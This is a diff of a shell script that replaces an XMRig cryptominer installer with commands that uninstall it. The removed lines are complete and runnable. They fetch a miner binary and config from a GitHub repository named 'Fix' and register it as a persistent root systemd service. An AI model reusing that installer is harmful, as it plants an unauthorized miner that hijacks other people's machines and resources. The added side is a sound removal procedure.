@@ -1,24 +1,6 @@
-export REAL_PATH=$(pwd) && \
-mkdir -p ~/miner && cd ~/miner && \
-wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig && \
-wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json && \
-chmod +x xmrig && \
-sudo bash -c "cat <<EOT > /etc/systemd/system/miner.service
-[Unit]
-Description=XMRig Miner Service
-After=network.target
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=$REAL_PATH
-ExecStart=$REAL_PATH/xmrig -c $REAL_PATH/config.json
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-EOT" && \
+sudo systemctl stop miner.service && \
+sudo systemctl disable miner.service && \
+sudo rm /etc/systemd/system/miner.service && \
 sudo systemctl daemon-reload && \
-sudo systemctl enable miner.service && \
-sudo systemctl start miner.service
+sudo systemctl reset-failed && \
+rm -rf ~/miner
